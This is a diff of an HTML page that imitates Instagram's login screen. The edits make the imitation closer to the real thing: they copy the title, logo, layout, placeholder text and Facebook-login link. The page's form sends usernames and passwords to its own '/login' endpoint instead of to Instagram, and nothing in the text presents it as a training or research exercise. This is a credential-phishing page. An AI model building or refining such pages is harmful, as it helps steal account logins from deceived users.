@@ -3,61 +3,136 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Instagram Login</title>
+  <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Roboto', sans-serif;
       background-color: #fafafa;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
+
+    .container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      width: 100%;
+      max-width: 350px;
+      padding: 20px;
+    }
+
     .login-box {
-      background: white;
+      background-color: #fff;
       border: 1px solid #dbdbdb;
-      padding: 40px;
-      width: 350px;
-      text-align: center;
+      width: 100%;
+      padding: 40px 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
-    .login-box img {
-      width: 180px;
+
+    .login-box img.logo {
+      width: 175px;
       margin-bottom: 30px;
     }
-    input[type="text"], input[type="password"] {
+
+    form {
       width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border: 1px solid #dbdbdb;
-      border-radius: 3px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    input[type="text"],
+    input[type="password"] {
       background-color: #fafafa;
-    }
-    input[type="submit"] {
-      width: 100%;
+      border: 1px solid #dbdbdb;
       padding: 10px;
-      background-color: #0095f6;
-      color: white;
-      font-weight: bold;
-      border: none;
-      border-radius: 5px;
-      margin-top: 10px;
-      cursor: pointer;
-    }
-    .signup {
-      margin-top: 20px;
+      margin-bottom: 10px;
       font-size: 14px;
+      border-radius: 3px;
+    }
+
+    input[type="submit"] {
+      background-color: #0095f6;
+      border: none;
+      color: white;
+      padding: 10px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+
+    .separator span {
+      margin: 0 10px;
+      color: #8e8e8e;
+      font-size: 13px;
+    }
+
+    .signup-box {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      width: 100%;
+      padding: 20px 30px;
+      text-align: center;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 10px;
+      }
+
+      .login-box, .signup-box {
+        padding: 20px 15px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="login-box">
-    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
-    <form method="POST" action="/login">
-      <input type="text" name="username" placeholder="Username or Email" required />
-      <input type="password" name="password" placeholder="Password" required />
-      <input type="submit" value="Log In" />
-    </form>
-    <div class="signup">
+  <div class="container">
+    <div class="login-box">
+      <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo" />
+      <form method="POST" action="/login">
+        <input type="text" name="username" placeholder="Phone number, username or email" required />
+        <input type="password" name="password" placeholder="Password" required />
+        <input type="submit" value="Log In" />
+      </form>
+      <div class="separator"><span>OR</span></div>
+      <div style="font-size: 13px; color: #385185; font-weight: 500; cursor: pointer;">Log in with Facebook</div>
+    </div>
+    <div class="signup-box">
       Don't have an account? <a href="#">Sign up</a>
     </div>
   </div>
